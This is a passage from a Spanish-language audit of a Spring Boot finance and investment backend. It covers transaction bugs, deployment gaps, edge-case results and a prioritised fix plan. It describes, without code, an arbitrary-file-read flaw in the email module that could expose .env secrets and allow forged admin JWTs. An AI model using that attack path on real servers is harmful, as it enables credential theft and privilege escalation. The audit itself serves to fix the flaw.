**Acción: portar `c0cbac8` a `main`.** Es un cherry-pick.

---

### ERROR CRÍTICO #2 — `POST /api/v1/orders` devuelve 500 en los dos casos de rechazo

**Archivo:** `src/main/java/com/checkout/backend/investment_portfolio/trade_order/service/TradeOrderService.java:106-127`

**Problema.** El método pretende convertir un rechazo de negocio en una fila `REJECTED` persistida:
```java
try {
    if (request.getSide() == OrderSide.BUY) {
        walletService.record(user, tokens.negate(), TokenReason.INVESTMENT, null);
        portfolioService.applyBuy(...);
    } else {
        portfolioService.applySell(user, asset, request.getQuantity());
        walletService.record(user, tokens, TokenReason.INVESTMENT, null);
    }
    order.setStatus(OrderStatus.EXECUTED);
} catch (InvalidRequestException rejected) {
    order.setStatus(OrderStatus.REJECTED);
    order.setRejectionReason(rejected.getMessage());
    order.setTokensMoved(BigDecimal.ZERO);
}
return toResponse(orderRepository.save(order));   // ← este commit falla
```
`walletService.record` y `portfolioService.applySell` son métodos `@Transactional` de **otros beans**, así que se invocan por proxy y se unen a la transacción de `place` como **transacciones participantes**. Cuando una de ellas lanza `InvalidRequestException` —que es una `RuntimeException`—, el interceptor transaccional de Spring marca la transacción compartida como **rollback-only** antes de que la excepción llegue al `catch`.

El `catch` la atrapa y sigue como si nada. Pero la transacción ya está condenada: al intentar el commit, Spring lanza `UnexpectedRollbackException: Transaction silently rolled back because it has been marked as rollback-only`. Y como esa excepción **no tiene handler** (§13, E-2), sale por el catch-all como **500**.

**Cómo reproducirlo.** Verificado en ejecución real. La sonda es el propio test del repositorio, `RemainingModulesApiTest.anUnaffordableOrderIsRecordedAsRejected`, **sin el `@Transactional` de clase**:
```
POST /api/v1/orders  {"side":"BUY","quantity":5,...}  con saldo 0
  esperado por el test: 201  {"status":"REJECTED","rejectionReason":"...","tokensMoved":0}
  real:                 500  {"status":500,"error":"Internal Server Error",
                              "message":"Ocurrio un error interno. Intentalo de nuevo mas tarde."}
  Type = org.springframework.transaction.UnexpectedRollbackException
```
Igual con `sellingWithoutAPositionIsRejected`. **Los dos únicos caminos de rechazo del módulo de inversión devuelven 500.**

**Por qué el test pasa en la suite.** `RemainingModulesApiTest.java:45` lleva `@Transactional` **a nivel de clase**. Eso convierte al método de test en dueño de la transacción externa, y `place` pasa a ser una transacción participante más, cuyo "commit" no comprueba la marca de rollback global. El fallo desaparece del test y permanece en producción. Es el caso de manual de un test que da confianza falsa.

**Impacto.** Un usuario que intenta comprar sin fichas suficientes —el caso más común del módulo— recibe un 500 en vez de ver su orden rechazada con el motivo. No hay pérdida de datos ni transacción parcial (el rollback es total y correcto), pero:
- el historial de órdenes rechazadas, que es una funcionalidad declarada y documentada, **no funciona**;
- el frontend recibe 500 donde espera 201 y tendrá que tratarlo como error del servidor;
- **es el fallo más probable de que aparezca durante la demo**, porque el saldo inicial de un usuario nuevo es 0 y la primera compra que alguien intente será exactamente este caso.

**Corrección recomendada.** El rechazo debe decidirse **antes** de entrar en la transacción de escritura, o la escritura de la orden rechazada debe ocurrir en una transacción propia. Dos opciones, en orden de preferencia:

1. **Consultar en vez de provocar la excepción.** Añadir métodos de solo lectura (`walletService.hasBalance(user, tokens)`, `portfolioService.hasPosition(user, asset, quantity)`), decidir el rechazo con ellos, y **no llamar nunca** a `record` ni a `applySell` en el camino de rechazo. Así ninguna excepción marca la transacción y no hay nada que atrapar.
2. **Aislar la persistencia del rechazo** en un método anotado `@Transactional(propagation = Propagation.REQUIRES_NEW)`, de modo que la orden `REJECTED` se guarde en una transacción independiente de la que se aborta.

En ambos casos, **quitar el `@Transactional` de clase de los tests de flujo financiero** (§16), o el arreglo no quedará cubierto por ninguna prueba.

---

### ERROR CRÍTICO #3 — No hay despliegue, y el que se haga borrará la base en cada reinicio

**Archivos:** ausencia de `Dockerfile`; `src/main/resources/application.properties:5`

**Problema.** Dos cosas encadenadas. No existe `Dockerfile`, así que no hay imagen de la aplicación y `compose.yaml` solo levanta PostgreSQL: **no hay nada despegable**, y el criterio 8 de la rúbrica (2.0 puntos, el segundo más alto después de seguridad) está en cero.

Y cuando se haga, `spring.jpa.hibernate.ddl-auto=${DDL_AUTO:create-drop}` tiene **`create-drop` como valor por defecto**. Si alguien despliega sin fijar `DDL_AUTO` —que es exactamente lo que pasa cuando se despliega con prisa— Hibernate **borra y recrea el esquema completo en cada arranque**. En ECS, donde el contenedor se reinicia por un despliegue, un health check fallido o un reescalado, eso es pérdida total de datos de forma rutinaria y silenciosa.

**Cómo reproducirlo.** `ls Dockerfile*` → no existe. Y leer la línea 5 de `application.properties`.

**Impacto.** 2.0 puntos de rúbrica en cero, más una bomba de relojería para el día del despliegue.

**Corrección recomendada.**
1. `Dockerfile` multi-stage: `maven:3.9-eclipse-temurin-21` para construir, `eclipse-temurin:21-jre-alpine` para ejecutar, usuario no root, `EXPOSE 8080`.
2. Añadir el servicio `app` a `compose.yaml` con `depends_on: {postgres: {condition: service_healthy}}` —el healthcheck ya está puesto y es justo para esto.
3. **Cambiar el default a `validate`**: `${DDL_AUTO:validate}`. Y `${SHOW_SQL:false}`.
4. Desplegar. Con Railway o Render se consigue 1.0 de los 2.0 en una tarde; ECS + RDS da los 2.0 completos.

---

## 20. Errores que probablemente romperán el frontend

**El contrato es bueno en general.** Los `Response` no exponen entidades, los `BigDecimal` se serializan como números JSON (no como string), las fechas usan ISO-8601, los enums van como nombre, y los derivados que el frontend necesita (`availableBalance`, `marketValue`, `unrealizedPnl`, `difference`) vienen calculados desde el servidor en vez de dejarse al cliente. El error tiene un formato único y estable en los 47 endpoints. Nada de esto obliga a rehacer nada.

Lo que sí obligará a tocar el frontend, ordenado por coste:

| # | Cambio que vendrá | Qué rompe | Severidad |
|---|---|---|---|
| F-1 | **Rutas del módulo de correo.** Hoy `POST /api/v1/sendMail` y `/sendEmailWithAttatchment` con body JSON y `recipient` + `attachment`. El fix de #28 las cambia a `/api/v1/emails` y `/api/v1/emails/with-attachment`, con `multipart/form-data` y sin `recipient` | Rutas, método de codificación y forma del body. **Reescritura completa de la llamada** | **ALTO — pero inevitable: es la corrección del crítico #1. Hacerlo antes de que exista frontend** |
| F-2 | **`POST /orders` devuelve 500 donde debería devolver 201 REJECTED.** Si el frontend se escribe contra el comportamiento actual, tratará el rechazo como error del servidor. Al corregir el crítico #2, pasará a 201 con `status:"REJECTED"` | La lógica de manejo de la respuesta de compra | **ALTO** |
| F-3 | **`realizedPnl` no existe** en ningún DTO. Una pantalla de cartera lo necesita, y añadirlo después es un campo nuevo en `PositionResponse` y `PortfolioResponse` | Añadir campos es compatible hacia atrás, pero la pantalla hay que rehacerla | MEDIO |
| F-4 | **Sin paginación.** Cuando se añada, `GET /incomes` pasará de devolver `[...]` a devolver `{content:[...], totalElements, ...}`. **Eso sí es incompatible** | Todo listado | MEDIO — **decidirlo ahora**, no después |
| F-5 | `DELETE /orders/{id}` devuelve cuerpo y no borra. Si se corrige a `POST /orders/{id}/cancel`, cambia la llamada | Una llamada | BAJO |
| F-6 | En `PositionResponse`, `currentPrice`, `marketValue` y `unrealizedPnl` **pueden venir `null`** si el activo no tiene cotización. Es la decisión correcta del backend, pero el frontend debe manejar los tres nulos explícitamente o mostrará "NaN" | Renderizado | BAJO — **documentarlo** |
| F-7 | No hay endpoint para cambiar contraseña ni correo | Pantalla de perfil incompleta | BAJO |

**Recomendación de orden:** resolver F-1, F-2 y decidir F-4 **antes** de escribir la primera línea de frontend. Los tres son cambios incompatibles y los tres son inevitables.

---

## 21. Errores de lógica de negocio

Separados de los críticos porque no rompen nada hoy, pero son decisiones incorrectas o incompletas.

| # | Archivo:línea | Problema | Severidad |
|---|---|---|---|
| L-1 | `IncomeService.java:103` | Borrar un ingreso llama a `debit`, que valida contra el **saldo disponible**. Si el dinero ya está comprometido en una meta, el usuario **no puede borrar un ingreso que registró por error**: 400 y callejón sin salida, porque tampoco hay PUT. Registrar 5000 en vez de 500 y comprometerlo en una meta deja la cuenta en un estado que el usuario no puede corregir | **MEDIO** |
| L-2 | `IncomeController`, `ExpenseController` | **No existe PUT/PATCH para ingresos ni gastos.** La única corrección posible es borrar y volver a crear, y L-1 puede impedir el borrado. La rúbrica no exige el PUT, pero sí menciona modificación, y `SavingsGoal` sí lo tiene: es una inconsistencia dentro del propio proyecto | **MEDIO** |
| L-3 | `PortfolioService` | `realizedPnl` no se calcula ni se guarda. El beneficio llega al monedero pero no queda registrado como resultado realizado. Sin él, "cuánto he ganado vendiendo" no se puede responder | **MEDIO** |
| L-4 | `AssetService.java:158` | `requireQuote` no comprueba antigüedad. Una orden se ejecuta contra una cotización de hace días sin aviso. `AssetQuote.updatedAt` ya existe: falta el umbral | **MEDIO** |
| L-5 | `ContributionService` | Cumplir una meta **no paga ninguna recompensa en fichas**, aunque la propuesta lo sugiere y `TokenReason` existe para ello. No hay doble recompensa porque no hay recompensa. Es también el gancho natural para el evento que falta (§15) | **MEDIO** |
| L-6 | `Savings.java:36` | `currentBalance` **no tiene `@DecimalMin("0")`**, a diferencia de `TokenWallet.tokenBalance`. La garantía de no-negativo es solo de código. Asimetría injustificada entre dos campos que cumplen el mismo papel | **BAJO** |
| L-7 | `MinigameSessionService` | No hay límite de frecuencia de partidas. El coste por partida es el único freno; con `tokenCost = 0` y `maxTokenReward > 0`, un bucle genera fichas sin límite. **Depende de que un ADMIN nunca publique un juego gratis que pague** | **BAJO (ALTO si se publica tal juego)** |
| L-8 | `PortfolioService.java:177` | `.max(BigDecimal.ZERO)` sobre `investedTokens` oculta una desviación en vez de señalarla | **BAJO** |

---

## 22. Casos límite

Los 27 casos que el prompt exige, cada uno con su resultado real.

| # | Caso | Resultado | Correcto |
|---|---|---|---|
| 1 | monto = 0 | 400, `@DecimalMin("0.01")` | ✅ |
| 2 | monto negativo | 400, misma validación | ✅ |
| 3 | monto enorme | error de base al exceder `precision 19`, no desbordamiento silencioso | ✅ |
| 4 | fecha futura en ingreso/gasto | 400, `@PastOrPresent` | ✅ |
| 5 | deadline pasada al crear meta | 400, `@Future`. En una meta ya guardada es estado válido (es el que hay que escribir para marcarla EXPIRED), y la entidad no lo valida a propósito | ✅ |
| 6 | usuario inexistente | 401 desde el `AuthenticationEntryPoint` | ✅ |
| 7 | recurso de otro usuario | **404**, no 403 — no filtra existencia | ✅ |
| 8 | recurso inexistente | 404 | ✅ |
| 9 | email duplicado en registro | 409 `DuplicateResourceException` | ✅ |
| 10 | saldo insuficiente en gasto | 400 con el disponible en el mensaje | ✅ |
| 10b | fichas insuficientes en compra | **500** en vez de 201 REJECTED | 🔴 **#2** |
| 11 | dos operaciones simultáneas sobre el mismo saldo | datos íntegros (`@Version`), pero **500** en vez de 409 | 🟡 **E-1** |
| 12 | refresh token expirado | 401 | ✅ |
| 13 | refresh token reutilizado | 401 + **revocación de toda la familia** (visible en el log real) | ✅ |
| 14 | activo sin cotización | 400 con mensaje claro; en el listado de cartera, derivados en `null` sin tumbar la lectura | ✅ |
| 15 | cotización negativa o cero | 400, doble validación (DTO y servicio) | ✅ |
| 16 | orden con cantidad 0 | 400, `@DecimalMin(inclusive=false)` | ✅ |
| 17 | venta mayor a la posición | **500** en vez de 201 REJECTED | 🔴 **#2** |
| 18 | aporte a meta ya completada | 400 *"Esta meta ya esta cumplida."* | ✅ |
| 18b | aporte a meta vencida | 400 con la fecha; `applyExpiration` corre antes | ✅ |
| 18c | aporte que supera lo que falta | 400 con el remanente | ✅ |
| 19 | doble recompensa | imposible: `UNIQUE(reason, reference_id)` + `completedAt` sellado una vez | ✅ |
| 20 | asset inexistente | 404 | ✅ |
| 21 | minijuego archivado | no jugable, `findPublished` | ✅ |
| 22 | DTO con campos inesperados | ignorados por Jackson; ningún campo sensible es asignable (§5) | ✅ |
| 23 | ID manipulado en la ruta | 404 vía `findByIdAndUserId` | ✅ |
| 24 | JWT con `uid` inexistente | 401: `SecurityContextCurrentUserProvider` no resuelve el usuario | ✅ |
| 25 | JWT con rol inválido | el rol desconocido se descarta en `extractRoles:83`, el resto del token sigue válido | ✅ |
| 26 | JWT expirado | 401 | ✅ |
| 27 | JWT firmado con secreto incorrecto | 401: `verifyWith(key)` falla y `parseToken` devuelve `null` | ✅ |
| **28** | **adjunto = ruta arbitraria del servidor** | **202 y el archivo se envía** | 🔴 **#1** |

**24 de 28 correctos.** Los cuatro fallos son los dos críticos y la laguna del locking optimista.

---

## 23. Qué está correctamente implementado

No todo es corrección de defectos. Estas decisiones son mejores de lo que la rúbrica pide y merecen constar:

1. **El patrón de ownership.** `findByIdAndUserId` en los 9 repositorios de recursos de usuario, con 404 en vez de 403. El filtro está en el WHERE, no en un `if` que alguien pueda olvidar, y la respuesta no filtra existencia. **Cero IDOR en 47 endpoints.**
2. **`ApiException` portando su propio `HttpStatus`.** Elimina el `Map<Class, HttpStatus>` en el handler, que es donde una excepción nueva acaba devolviendo 500 sin que nadie se dé cuenta. Una subclase nueva funciona sin tocar el handler.
3. **22 `@ExceptionHandler`.** Cobertura muy por encima de lo habitual, incluyendo `HandlerMethodValidationException`, 415, 406 y el acierto de mandar `MissingPathVariableException` a **500** —una plantilla de ruta mal escrita es un bug del servidor, no del cliente.
4. **`@JsonInclude(NON_EMPTY)` en el componente `fieldErrors` y no a nivel de tipo.** A nivel de tipo también habría borrado `message` cuando llegara vacío. Es un detalle de dos líneas que solo se acierta si se ha pensado.
5. **El monedero de fichas no tiene API de escritura.** No existe `TokenWalletRequest` en todo el proyecto. Las fichas se mueven solo desde el servicio que gobierna el hecho que las mueve. Es la diferencia entre una economía simulada y un contador decorativo.
6. **El modelo de sobre virtual.** `currentBalance` / `committedAmount` / `availableBalance`, con el aporte a una meta **comprometiendo** dinero en vez de moverlo. Evita la doble contabilización que este tipo de proyecto casi siempre tiene.
7. **Idempotencia por `UNIQUE(reason, reference_id)`** en el libro de fichas, con el truco de la referencia negada para distinguir cobro de recompensa de la misma partida bajo el mismo motivo.
8. **`balanceAfter` en cada asiento del libro.** Permite detectar una desviación leyendo una fila, no sumando el historial.
9. **El costo promedio ponderado es exacto, y la venta no lo corrompe.** Verificado: 10@62.80 + 10@52.80 → 57.80; venta de 5@70 → sigue 57.80 e `investedTokens` baja por coste medio, no por importe de venta. Justificado en el comentario del código.
10. **Copiar `executionPrice` y `tokenRate` a la fila de la orden**, y `tokenCost`/`maxTokenReward` a la fila de la partida. Sin eso, editar el catálogo reescribiría el historial.
11. **`JwtProperties` como `record` con constructor compacto que impide arrancar con un secreto débil.** El secreto no tiene default: si falta la variable, la aplicación no arranca, en vez de arrancar con un secreto conocido.
12. **Rotación de refresh tokens con hash SHA-256 y revocación de familia al detectar reutilización.** Es la defensa correcta contra replay, y se la vio funcionar en el log de la corrida real.
13. **`ConfigurationContractTest`.** Un test que **falla el build** si una variable de entorno no está documentada en `.env.example`, si sobra una entrada o si aparece una credencial hardcodeada. Muy poco común y evita toda una categoría de "en mi máquina funciona".
14. **`AssetQuote` + `AssetPriceHistory` como tablas separadas**, escritas en la misma transacción. Resuelve por adelantado el conflicto entre "cotización vigente" e "histórico para el gráfico" que el prompt señalaba como riesgo de frontend.
15. **La matemática de proyecciones es correcta en las dos fórmulas, comparte convención de anualidad ordinaria, y trata la tasa cero por rama aparte** para no dividir por cero. `BigDecimal` con `MathContext` explícito, nunca `double`.
16. **Los tests son de integración con la cadena de seguridad real y tokens JWT de verdad**, no con un doble de `CurrentUserProvider`. Es lo que hace que los `@PreAuthorize` se ejecuten realmente en la prueba.
17. **Tope de recompensa en minijuegos** como límite documentado ante un problema que no se puede resolver en el alcance (la puntuación la controla el cliente). Se declara como límite, no se vende como solución.
18. **CI en cada PR** desde el commit 21, con el `chmod +x mvnw` que hace falta porque el wrapper se commiteó desde Windows sin bit de ejecución.

---

## 24. Plan de corrección priorizado

### P0 — Bloqueantes (sin esto no se entrega)

| # | Acción | Archivos | Esfuerzo | Rúbrica |
|---|---|---|---|---|
| P0-1 | **Portar el PR #28 a `main`.** Cierra el crítico #1 completo. El código existe, está probado con 7 tests, y solo hace falta un cherry-pick de `c0cbac8` | módulo `email/` + `config/MailConfig.java` | **15 min** | evita el hallazgo de seguridad; 7.3: 0.25 → 0.5 |
| P0-2 | **Arreglar el rechazo de órdenes.** Decidir el rechazo con consultas de solo lectura en vez de provocar y atrapar la excepción (opción 1 de §19 #2) | `TradeOrderService.java:106-127` | 2 h | 6.2: 0.5 → 0.7 |
| P0-3 | **Quitar `@Transactional` de clase** en los tests de flujo financiero de escritura y limpiar con `@AfterEach`. Sin esto, P0-2 no queda cubierto por ninguna prueba y el fallo puede volver | `RemainingModulesApiTest.java:45`, `SavingsApiFlowTest` | 1 h | protege 6.2 y 4.2 |
| P0-4 | **Escribir el README.** Qué es el proyecto, stack, cómo levantarlo (`.env` + compose + `mvnw`), variables de entorno, estructura de paquetes, endpoints principales, cómo correr los tests | `README.md` | 2 h | 9.1: **0 → 0.4** |
| P0-5 | **`${DDL_AUTO:validate}` y `${SHOW_SQL:false}`** | `application.properties:5,6` | **2 min** | evita pérdida de datos en producción |

**P0 completo: ~5 horas. Nota: 15.35 → 16.05, y los tres críticos cerrados salvo despliegue.**

### P1 — Alta prioridad (puntos de rúbrica directos)

| # | Acción | Esfuerzo | Rúbrica |
|---|---|---|---|
| P1-1 | **Implementar eventos de aplicación.** `ApplicationEventPublisher` en `ContributionService:93` (meta completada) y `TradeOrderService:117` (orden ejecutada), con `@TransactionalEventListener(phase = AFTER_COMMIT)` para que el correo no salga antes del commit ni tras un rollback. Conecta con el módulo de email ya existente y cierra el issue #10 | 4 h | 7.1: **0 → 1.0** |
| P1-2 | **Dockerfile multi-stage + servicio `app` en `compose.yaml`** (el healthcheck de postgres ya está puesto para el `depends_on`) | 2 h | habilita el criterio 8 |
| P1-3 | **Desplegar.** Railway/Render → 1.0. ECS + RDS → 2.0 | 4–8 h | 8: **0 → 1.0 o 2.0** |
| P1-4 | **Handler de `ObjectOptimisticLockingFailureException` → 409** con mensaje de reintento | 30 min | 4.2: 1.0 → 1.2 |
| P1-5 | **Cerrar los issues #4 a #9 y #11** con un comentario apuntando a su PR | 10 min | 9.3: 0.1 → 0.2 |

**P0 + P1 completo: ~20 horas. Nota: 15.35 → 19.55 / 20.**

### P2 — Importantes (calidad y contrato de frontend)

- **P2-1** Normalizar `EmailController`: `@RequestMapping("/emails")`, DTO de respuesta en vez de `String`, `@Valid` en los dos endpoints. *(P0-1 ya hace la mayor parte.)* → 6.1: 0.6 → 0.8
- **P2-2** Inyección por constructor en `EmailServiceImplemented`, eliminando `@Autowired` sobre campo. *(P0-1 ya lo hace.)* → 3.3: 0.5 → 0.6
- **P2-3** `PUT /incomes/{id}` y `PUT /expenses/{id}`, y revisar el borrado de ingresos comprometidos (L-1, L-2).
- **P2-4** Calcular, persistir y exponer `realizedPnl` (L-3, F-3).
- **P2-5** **Decidir la paginación ahora** y aplicarla a los cuatro listados que crecen sin límite (R-4, F-4). Es un cambio incompatible: hacerlo antes del frontend.
- **P2-6** Umbral de antigüedad en `requireQuote` usando `AssetQuote.updatedAt` (L-4).
- **P2-7** `spring.jpa.open-in-view=false` (J-2) y resolver el N+1 de `toPositionResponse` con `@EntityGraph` (J-1).
- **P2-8** `springdoc.api-docs.enabled=${SWAGGER_ENABLED:false}` para no dejar Swagger abierto en producción.
- **P2-9** Tests de PnL y un test de concurrencia real con dos hilos sobre el monedero.

### P3 — Mejoras y bonus

- Recompensa en fichas al completar una meta (L-5), como primer consumidor del evento de P1-1.
- `POST /orders/{id}/cancel` en lugar de `DELETE` (R-2).
- `?includeInactive=true` en lugar de `/all` (R-3).
- `@DecimalMin("0")` en `Savings.currentBalance` por simetría con `TokenWallet` (L-6).
- Profiles `dev`/`prod`.
- Endpoint de cambio de contraseña y de correo (F-7).
- Bonus de rúbrica sin tocar: cobertura declarada >80%, logging estructurado, S3.

---

## 25. Checklist final para entregar

**Modelo de datos y persistencia**
- [x] 17 entidades JPA con el E-R definitivo respetado en las 16 relaciones
- [x] Constraints: 8 UNIQUE, 12 FK nombradas, 6 índices, 1 CHECK
- [x] `@Version` en las cuatro entidades con saldo
- [x] Sin EAGER accidental, sin cascade destructivo, sin recursión JSON
- [ ] N+1 de `toPositionResponse` resuelto *(P2-7)*
- [ ] `open-in-view=false` *(P2-7)*

**DTOs y mapeo**
- [x] Separación Request/Response en 29 DTOs
- [x] Ningún `id`, `userId`, `roles` ni campo derivado aceptado del cliente
- [x] ModelMapper STRICT con derivados calculados en servicio
- [ ] `EmailDetails` reemplazado por `EmailRequest` *(P0-1)*

**Arquitectura**
- [x] Controller → Service → Repository sin atajos
- [x] `CurrentUserProvider` como única puerta al `SecurityContext`
- [ ] Inyección por constructor en el 100% de los servicios *(P0-1)*

**Excepciones**
- [x] 6 excepciones propias bajo `ApiException` con su `HttpStatus`
- [x] 22 `@ExceptionHandler` y `ErrorResponseDTO` con los 5 campos
- [x] Sin stack traces ni nulls al cliente
- [ ] `ObjectOptimisticLockingFailureException` → 409 *(P1-4)*
- [ ] `UnexpectedRollbackException` deja de producirse *(P0-2)*

**Seguridad**
- [x] Spring Security stateless, CORS por entorno, 401/403 diferenciados
- [x] JWT con `sub`/`uid`/`roles`/`exp`, secreto por entorno con piso de 32 caracteres
- [x] 9 `@PreAuthorize` reales, probados
- [x] BCrypt, contraseña con complejidad exigida
- [x] Refresh con rotación, hash y revocación de familia
- [x] **Cero IDOR en 47 endpoints**
- [ ] **Lectura arbitraria de archivos cerrada** *(P0-1)* ← **bloqueante**
- [ ] **Relay abierto cerrado** *(P0-1)* ← **bloqueante**

**REST**
- [x] `/api/v1` centralizado, plurales, `@Valid`, `Location`, códigos correctos en 45 de 47 endpoints
- [ ] `POST /orders` devuelve 201 REJECTED en vez de 500 *(P0-2)* ← **bloqueante**
- [ ] `EmailController` normalizado *(P0-1, P2-1)*
- [ ] Paginación decidida *(P2-5)*

**Eventos y async**
- [x] `@EnableAsync`, executor dedicado, sin self-invocation
- [x] Email real por SMTP, asíncrono, 202
- [ ] **Eventos de aplicación** *(P1-1)* ← 1.0 punto entero

**Deployment**
- [x] PostgreSQL en compose con healthcheck y volumen
- [x] Variables de entorno con contrato verificado por test
- [ ] **`DDL_AUTO` por defecto en `validate`** *(P0-5)* ← **bloqueante**
- [ ] **Dockerfile** *(P1-2)*
- [ ] **Despliegue funcionando** *(P1-3)* ← 2.0 puntos

**GitHub y documentación**
- [x] 41 commits vía PR, mensajes convencionales, 6 autores, `.env` ignorado
- [x] CI en cada PR
- [x] Swagger activo
- [ ] **README** *(P0-4)* ← **bloqueante**
- [ ] Issues #4–#9 y #11 cerrados *(P1-5)*

**Tests**
- [x] 185 tests en verde
- [x] Integración con seguridad real y tokens de verdad
- [ ] `@Transactional` de clase retirado de los flujos financieros *(P0-3)* ← **bloqueante**
- [ ] Tests de PnL y de concurrencia *(P2-9)*

---

## ¿El proyecto está listo para entregar?

**No.**

Y conviene decir por qué no, porque la respuesta corta engaña. El núcleo de este proyecto está por encima de lo que la rúbrica pide: el modelo de datos respeta el E-R en las 16 relaciones, no hay un solo IDOR en 47 endpoints, el costo promedio ponderado y las tres fórmulas de proyección son matemáticamente exactas y se verificaron a mano, el locking optimista impide de verdad el doble gasto, y hay un test que rompe el build si alguien olvida documentar una variable de entorno. Eso no es un proyecto a medio hacer.

Lo que lo bloquea son **cinco cosas concretas**, y ninguna es de arquitectura:

**1. El módulo de correo permite que cualquier usuario registrado lea archivos del servidor.** Verificado en ejecución: un usuario recién creado obtuvo `pom.xml` en su buzón, y con `.env` obtendría el `JWT_SECRET`, con el que firmaría tokens de administrador que el sistema aceptaría como legítimos. Toda la seguridad bien construida del resto del proyecto queda anulada mientras esto siga en `main`. **El arreglo ya está escrito y probado en el PR #28; se mergeó contra la rama equivocada 28 segundos tarde y nunca llegó a `main`. Es un cherry-pick de quince minutos.** Es lo primero que hay que hacer hoy.

**2. `POST /api/v1/orders` devuelve 500 en los dos casos de rechazo.** Es el fallo más probable de aparecer en la demo, porque un usuario nuevo tiene saldo 0 y la primera compra que alguien intente será exactamente ese caso. La suite de tests lo tapa: el test que lo cubre pasa en verde y falla en cuanto se le quita el `@Transactional` de clase, porque esa anotación hace que los tests no reproduzcan los límites transaccionales de producción. Arreglar el servicio sin arreglar el test deja el agujero abierto para la próxima vez.

**3. No hay despliegue.** No hay Dockerfile, así que no hay nada despegable, y son 2.0 puntos —el segundo criterio de mayor peso— en cero. Además, `ddl-auto` tiene `create-drop` como valor por defecto: el día que se despliegue sin fijar `DDL_AUTO`, la base se borrará en cada reinicio del contenedor.

**4. El README dice `// TODO`.** Una línea, sobre 150 clases. Es lo primero que abre quien evalúa, vale 0.4 puntos directos, y son dos horas de trabajo. Es la peor relación esfuerzo/beneficio del proyecto.

**5. No existe ningún evento de aplicación.** Cero resultados en todo `src/main`. Es 1.0 punto íntegro, y los dos ganchos naturales ya están escritos y localizados.

**Orden de corrección, y no es negociable el primero:**

1. **Portar el PR #28** (15 min) — es una vulnerabilidad activa, no una deuda técnica.
2. **`${DDL_AUTO:validate}`** (2 min) — dos minutos que evitan perder la base en producción.
3. **Arreglar el rechazo de órdenes, y quitar el `@Transactional` de los tests financieros** (3 h) — el arreglo y su red de seguridad van juntos.
4. **Escribir el README** (2 h).
5. **Implementar los eventos** (4 h) — el punto más barato de la rúbrica.
6. **Dockerfile y desplegar** (6–10 h) — el más caro, y el que más da.

Los pasos 1 a 4 son **cinco horas** y dejan el proyecto **entregable, con 16.05 / 20**. Los seis completos son **unas veinte horas** y lo dejan en **19.55 / 20**.

Nada de esto exige rediseñar nada. Son cuatro archivos, un cherry-pick y un Dockerfile.
